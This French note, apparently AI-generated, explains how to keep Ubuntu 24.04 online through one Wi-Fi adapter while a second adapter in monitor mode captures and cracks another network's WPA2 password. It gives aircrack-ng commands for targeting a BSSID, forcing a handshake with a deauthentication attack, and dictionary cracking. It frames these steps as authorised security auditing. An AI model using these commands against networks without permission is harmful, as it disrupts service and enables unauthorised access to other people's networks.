---
audio: false
generated: true
image: false
lang: fr
layout: post
model: x-ai/grok-4-fast
title: Double adaptateur Wi‑Fi pour les tests de sécurité
translated: true
type: note
---

Oui, Ubuntu 24.04 peut se connecter à un réseau WiFi en utilisant un mot de passe connu (pour l'accès à Internet) tout en tentant simultanément de "pirater" (par exemple, cracker ou tester) le mot de passe d'un autre réseau WiFi, mais cela nécessite un matériel spécifique et une configuration minutieuse pour éviter les conflits. Cette configuration est courante pour les tests d'intrusion éthiques ou l'audit de sécurité sur vos propres réseaux—notez que l'accès non autorisé est illégal.

### Exigences Clés
- **Deux adaptateurs WiFi** : Vous avez besoin d'au moins deux interfaces sans fil séparées (par exemple, le WiFi intégré de l'ordinateur portable comme `wlan0` pour la connexion, et un adaptateur WiFi USB comme `wlan1` pour la surveillance). Un seul adaptateur ne peut pas être connecté (mode managé) et en mode surveillance en même temps.
  - Adaptateurs recommandés pour le mode surveillance : Intel (par exemple, AX200/AX210), Atheros, ou des chipsets Realtek compatibles. Vérifiez la compatibilité avec `iw list` (recherchez "monitor" sous les modes d'interface pris en charge).
- **Outils** : Installez la suite `aircrack-ng` pour la numérisation, la capture de handshakes et le cracking :  
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Spécificités d'Ubuntu 24.04** : Aucun changement majeur par rapport aux versions précédentes—NetworkManager gère les connexions, mais les outils de mode surveillance peuvent interférer s'ils ne sont pas gérés correctement. Le noyau 6.8+ prend bien en charge les adaptateurs modernes.

### Fonctionnement : Configuration Étape par Étape
1. **Connectez-vous au WiFi Connu (Mode Managé)** :
   - Utilisez NetworkManager (interface graphique ou CLI) pour vous connecter normalement :  
     ```
     nmcli device wifi connect "VotreSSIDConnu" password "motdepasseconnu"
     ```
   - Vérifiez : `nmcli connection show --active`. Cela maintient votre Internet actif sur la première interface (par exemple, `wlan0`).

2. **Configurez le Second Adaptateur pour la Surveillance (Sans Perturber le Premier)** :
   - Identifiez les interfaces : `iw dev` (par exemple, `wlan1` est votre adaptateur USB).
   - Évitez `airmon-ng` (de aircrack-ng), car il tue souvent NetworkManager et perturbe les connexions. Utilisez plutôt les commandes manuelles `iw` :  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - Vérifiez : `iw dev` (devrait afficher `type monitor` pour `wlan1`).

3. **Numérisez et Capturez pour le Cracking de Mot de Passe** :
   - Numérisez les réseaux : `sudo airodump-ng wlan1` (liste les SSID, BSSID, canaux ; appuyez sur Ctrl+C pour arrêter).
   - Ciblez un réseau spécifique (par exemple, BSSID `AA:BB:CC:DD:EE:FF` sur le canal 6) :  
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     Cela capture les paquets dans `capture-01.cap`. Pour le cracking WPA2, attendez un handshake en 4 étapes (ou forcez-en un de manière éthique avec deauth : `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`).
   - Cracker hors ligne : `sudo aircrack-ng -w /chemin/vers/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`.

4. **Rétablissez le Fonctionnement Normal** :
   - Arrêtez la surveillance :  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - Reconnectez-vous si nécessaire : Redémarrez NetworkManager (`sudo systemctl restart NetworkManager`) ou utilisez `nmcli`.

### Problèmes Potentiels et Corrections
- **Déconnexions** : Si le premier WiFi se déconnecte (rare avec la méthode manuelle), renouvelez le DHCP : `sudo dhclient -r wlan0 && sudo dhclient wlan0`.
- **Interférences** : Tuez les processus conflictuels uniquement sur l'interface de surveillance : `sudo airmon-ng check kill` (mais cela affecte tout—à utiliser avec prudence).
- **Stabilité de l'Adaptateur USB** : Certains adaptateurs bon marché tombent en panne en mode surveillance ; testez avec `iwconfig` ou `iw dev`.
- **Alternative Filaire** : Si vous n'avez pas de second WiFi, utilisez Ethernet pour Internet et surveillez sur l'adaptateur WiFi unique (plus facile, car tuer NetworkManager n'affectera pas la connexion filaire).

Cette configuration fonctionne de manière fiable sur Ubuntu 24.04 à des fins de test. Obtenez toujours une autorisation avant de tester les réseaux.

### Références
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)  
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)  
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)